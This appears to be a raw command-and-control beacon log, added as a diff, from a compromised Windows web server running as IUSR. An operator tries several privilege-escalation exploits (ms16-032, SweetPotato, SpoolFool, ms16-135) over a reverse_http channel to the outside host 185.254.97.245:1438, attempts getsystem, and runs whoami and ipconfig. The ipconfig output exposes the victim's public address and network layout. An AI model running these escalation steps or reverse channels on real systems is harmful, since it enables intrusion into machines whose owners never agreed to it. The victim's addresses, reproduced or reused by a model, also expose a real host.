@@ -1,0 +1,124 @@
+12/10 17:36:37 UTC [metadata] 1.179.164.150 <- 169.254.224.52; computer: WWW; user: IUSR; process: jhc.exe; pid: 45256; os: Windows; version: 6.0; build: 6003; beacon arch: x64 (x64)
+12/10 17:37:50 UTC [output]
+Ladon ms16135 
+
+12/10 17:37:50 UTC [error] Ladon.exe does not exist :(
+12/10 17:39:06 UTC [output]
+Ladon SpoolFool 
+
+12/10 17:39:06 UTC [error] Ladon.exe does not exist :(
+12/10 17:40:13 UTC [task] <> Tasked Beacon to run windows/beacon_http/reverse_http (185.254.97.245:1438) ms16-032
+12/10 17:40:22 UTC [checkin] host called home, sent: 142611 bytes
+12/10 17:40:47 UTC [error] Could not connect to pipe: 2
+12/10 17:41:12 UTC [input] <jhc> shell whoami
+12/10 17:41:12 UTC [task] <T1059> Tasked beacon to run: whoami
+12/10 17:41:14 UTC [checkin] host called home, sent: 37 bytes
+12/10 17:41:15 UTC [output]
+received output:
+nt authority\iusr
+
+
+12/10 17:42:30 UTC [input] <jhc> getsystem
+12/10 17:42:30 UTC [task] <T1134> Tasked beacon to get SYSTEM
+12/10 17:42:33 UTC [checkin] host called home, sent: 2743 bytes
+12/10 17:42:34 UTC [output]
+received output:
+getsystem failed.
+
+12/10 17:43:44 UTC [task] <> Task Beacon to run windows/beacon_http/reverse_http (185.254.97.245:1438) SweetPotato (ms16-075)
+12/10 17:43:50 UTC [checkin] host called home, sent: 892553 bytes
+12/10 17:47:13 UTC [input] <jhc> shell ipconfig
+12/10 17:47:13 UTC [task] <T1059> Tasked beacon to run: ipconfig
+12/10 17:47:14 UTC [checkin] host called home, sent: 39 bytes
+12/10 17:47:18 UTC [output]
+received output:
+
+Windows IP Configuration
+
+
+Ethernet adapter lan:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::c5d4:f04c:668:3f6c%14
+   Autoconfiguration IPv4 Address. . : 169.254.63.108
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 
+
+Ethernet adapter internet:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::ddcc:a83e:4df2:8a6e%13
+   IPv4 Address. . . . . . . . . . . : 1.179.164.150
+   Subnet Mask . . . . . . . . . . . : 255.255.255.252
+   Default Gateway . . . . . . . . . : 1.179.164.149
+
+Ethernet adapter Local Area Connection 3:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Ethernet adapter Local Area Connection 2:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::9d9f:e447:d58a:e034%10
+   Autoconfiguration IPv4 Address. . : 169.254.224.52
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 
+
+Tunnel adapter Local Area Connection* 8:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Tunnel adapter Local Area Connection* 9:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Tunnel adapter Local Area Connection* 11:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Tunnel adapter Local Area Connection* 12:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Tunnel adapter Local Area Connection* 13:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Tunnel adapter Local Area Connection* 14:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Tunnel adapter Local Area Connection* 17:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Tunnel adapter Local Area Connection* 18:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : 2002:1b3:a496::1b3:a496
+   Default Gateway . . . . . . . . . : 2002:c058:6301::c058:6301
+
+Tunnel adapter Local Area Connection* 21:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Tunnel adapter Local Area Connection* 24:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+
